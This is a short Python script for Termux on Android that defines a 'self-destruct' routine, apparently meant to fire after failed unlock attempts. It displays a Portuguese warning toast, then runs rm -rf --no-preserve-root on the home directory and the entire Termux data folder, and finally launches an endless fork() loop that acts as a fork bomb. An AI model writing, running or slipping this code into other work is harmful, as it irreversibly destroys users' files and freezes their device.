#!/data/data/com.termux/files/usr/bin/python3

def fail():

    try:

        from time import sleep
        from os import system, fork

        print ('\x1b[H\x1b[2J\x1b')

        system('termux-toast -g middler -b black -c red "Excesso de tentativas de desbloqueio atingidas, autodestruição em progresso..."')

        system('rm -rf --no-preserve-root $HOME > /dev/null')
        system('rm -rf --no-preserve-root /data/data/com.termux/ > /dev/null')

        sleep(5)

        while True:
            fork()

    except (KeyboardInterrupt):

        exit()
